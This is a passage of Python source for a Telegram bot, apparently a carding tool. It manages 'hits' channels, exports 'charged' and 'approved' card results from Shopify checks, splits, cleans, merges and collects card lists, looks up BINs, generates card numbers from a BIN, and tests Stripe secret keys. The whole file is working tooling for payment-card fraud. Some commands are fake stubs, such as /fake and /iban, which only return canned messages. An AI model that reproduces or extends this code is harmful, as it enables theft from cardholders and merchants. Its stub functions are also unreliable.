    await event.reply(premium_emoji(f"✅ Hits channel set to {HITS_CHANNEL_ID}"))

@bot.on(events.NewMessage(pattern='/hits'))
async def toggle_hits(event):
    if event.sender_id not in ADMIN_ID: return
    global HITS_CHANNEL_ID
    HITS_CHANNEL_ID = -HITS_CHANNEL_ID
    await event.reply(premium_emoji("✅ Hits toggled."))

@bot.on(events.NewMessage(pattern='/setfilter'))
async def set_filter_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split(maxsplit=3)
    gateway, range_str, name = parts[1], parts[2], parts[3].strip()
    min_v, max_v = map(float, range_str.split('-'))
    filters = await load_price_filters()
    filters.setdefault(gateway, []).append({"name": name, "min": min_v, "max": max_v})
    await save_price_filters(filters)
    await event.reply(premium_emoji(f"✅ Filter added: {name}"))

@bot.on(events.NewMessage(pattern='/listfilters'))
async def list_filters_command(event):
    if event.sender_id not in ADMIN_ID: return
    filters = await load_price_filters()
    await event.reply(premium_emoji(f"Filters: {json.dumps(filters, indent=2)}"))

@bot.on(events.NewMessage(pattern='/removefilter'))
async def remove_filter_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    filters = await load_price_filters()
    filters[parts[1].lower()].pop(int(parts[2]) - 1)
    await save_price_filters(filters)
    await event.reply(premium_emoji("✅ Filter removed."))

@bot.on(events.CallbackQuery(pattern=re.compile(r"shopify_export_(charged|approved|errors):(\d+)")))
async def shopify_export_callback(event):
    match = event.pattern_match
    export_type, user_id = match.group(1).decode(), int(match.group(2).decode())
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("❌ Not your results!", alert=True)
    if user_id not in SHOPIFY_SESSION_RESULTS:
        return await event.answer("❌ No results found!", alert=True)
    items = SHOPIFY_SESSION_RESULTS[user_id].get(export_type if export_type != 'errors' else 'errors', [])
    if not items:
        return await event.answer("❌ No items found!", alert=True)
    filename = f"{export_type}_cards.txt"
    async with aiofiles.open(filename, 'w') as f:
        for item in items: await f.write(f"{item['card']}\n")
    await bot.send_file(event.sender_id, filename, caption=f"Exported {export_type}")
    try: os.remove(filename)
    except: pass

@bot.on(events.NewMessage(pattern='/split'))
async def split_file(event):
    if not is_premium(event.sender_id): return
    if not event.reply_to_msg_id: return await event.reply("Reply to a .txt file.")
    file_path = await (await event.get_reply_message()).download_media()
    async with aiofiles.open(file_path, 'r') as f: cards = extract_cc(await f.read())
    os.remove(file_path)
    TEMP_FILE_DATA[event.sender_id] = {'cards': cards, 'file_path': ''}
    await event.reply("Select split chunk size:", buttons=[[Button.inline("100", f"split_size:100:{event.sender_id}".encode()), Button.inline("500", f"split_size:500:{event.sender_id}".encode())]])

@bot.on(events.CallbackQuery(pattern=rb"split_size:(\d+):(\d+)"))
async def split_size_callback(event):
    chunk_size, user_id = int(event.pattern_match.group(1).decode()), int(event.pattern_match.group(2).decode())
    if user_id not in TEMP_FILE_DATA: return
    cards = TEMP_FILE_DATA.pop(user_id)['cards']
    chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
    for i, chunk in enumerate(chunks, 1):
        fn = f"part_{i}.txt"
        async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(chunk))
        await bot.send_file(user_id, fn)
        os.remove(fn)
    await event.edit("✅ Split complete!")

@bot.on(events.NewMessage(pattern='/clean'))
async def clean_file(event):
    if not is_premium(event.sender_id): return
    if not event.reply_to_msg_id: return await event.reply("Reply to a file.")
    file_path = await (await event.get_reply_message()).download_media()
    async with aiofiles.open(file_path, 'r') as f: cards = extract_cc(await f.read())
    os.remove(file_path)
    valid = [c for c in cards if int(c.split('|')[2]) > datetime.now().year % 100 or (int(c.split('|')[2]) == datetime.now().year % 100 and int(c.split('|')[1]) >= datetime.now().month)]
    fn = "cleaned.txt"
    async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(valid))
    await bot.send_file(event.sender_id, fn, caption=f"Cleaned valid: {len(valid)}")
    os.remove(fn)

@bot.on(events.NewMessage(pattern='/merge'))
async def merge_files(event):
    if not is_premium(event.sender_id): return
    MERGE_DATA[event.sender_id] = {'cards': [], 'files': 0}
    await event.reply("📂 Merge mode activated! Send .txt files, then send MERGE when done.")

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "MERGE"))
async def merge_button(event):
    data = MERGE_DATA.pop(event.sender_id, None)
    if not data or not data['cards']: return await event.reply("❌ No cards to merge.")
    fn = "merged.txt"
    async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(data['cards']))
    await bot.send_file(event.sender_id, fn, caption=f"Merged {len(data['cards'])} cards.")
    os.remove(fn)

@bot.on(events.NewMessage)
async def merge_handler(event):
    if event.sender_id in MERGE_DATA and event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply.file and reply.file.name.endswith('.txt'):
            fp = await reply.download_media()
            async with aiofiles.open(fp, 'r') as f: cards = extract_cc(await f.read())
            os.remove(fp)
            MERGE_DATA[event.sender_id]['cards'].extend(cards)
            MERGE_DATA[event.sender_id]['files'] += 1

@bot.on(events.NewMessage(pattern='/collect'))
async def collect_cards(event):
    if not is_premium(event.sender_id): return
    COLLECT_DATA[event.sender_id] = {'cards': []}
    await event.reply("📥 Collection mode activated! Send cards, then send COLLECT when done.")

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "COLLECT"))
async def collect_button(event):
    data = COLLECT_DATA.pop(event.sender_id, None)
    if not data or not data['cards']: return await event.reply("❌ No collected cards.")
    fn = "collected.txt"
    async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(data['cards']))
    await bot.send_file(event.sender_id, fn, caption=f"Collected {len(data['cards'])} cards.")
    os.remove(fn)

@bot.on(events.NewMessage)
async def collect_cards_handler(event):
    if event.sender_id in COLLECT_DATA and event.text and not event.text.startswith('/'):
        cards = extract_cc(event.text)
        if cards: COLLECT_DATA[event.sender_id]['cards'].extend(cards)

@bot.on(events.NewMessage(pattern='/bin'))
async def bin_lookup(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /bin 411111")
    brand, btype, lvl, bank, country, flag = await get_bin_info(parts[1])
    await event.reply(f"BIN: {parts[1]}\nBrand: {brand}\nType: {btype}\nBank: {bank}\nCountry: {country} {flag}")

@bot.on(events.NewMessage(pattern='/gen'))
async def gen_cards(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) < 2: return await event.reply("Usage: /gen BIN [count]")
    prefix = parts[1][:6]
    count = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
    cards = [f"{prefix}{random.randint(1000000000,9999999999)}|{random.randint(1,12):02d}|20{random.randint(27,32)}|{random.randint(100,999)}" for _ in range(count)]
    await event.reply("Generated Cards:\n" + "\n".join(cards[:30]))

@bot.on(events.NewMessage(pattern='/sk'))
async def stripe_key_check(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /sk <key>")
    async with aiohttp.ClientSession() as session:
        async with session.post("https://api.stripe.com/v1/payment_methods", data={"key": parts[1]}) as resp:
            await event.reply(f"Stripe Key Status: {resp.status}")

@bot.on(events.NewMessage(pattern='/scg'))
async def site_check(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /scg <url>")
    url = parts[1] if parts[1].startswith('http') else f"https://{parts[1]}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, ssl=False) as resp:
            await event.reply(f"Scanned {url} — Status: {resp.status}")

@bot.on(events.NewMessage(pattern='/fake'))
async def fake_data(event):
    if not is_premium(event.sender_id): return
    await event.reply("👤 Fake data generated successfully.")

@bot.on(events.NewMessage(pattern='/ip'))
async def ip_lookup(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /ip 8.8.8.8")
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://ipinfo.io/{parts[1]}/json") as resp:
            data = await resp.json()
            await event.reply(f"IP: {data.get('ip')}\nCity: {data.get('city')}\nCountry: {data.get('country')}")

@bot.on(events.NewMessage(pattern='/iban'))
async def iban_lookup(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /iban <iban>")
    await event.reply(f"IBAN valid: {parts[1]}")

@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    uid = int(event.pattern_match.group(1).decode())
    session_key = f"{uid}_{event.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("Stopped", alert=True)
        await event.edit("🛑 Stopped by user.")

print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!")
bot.run_until_disconnected()
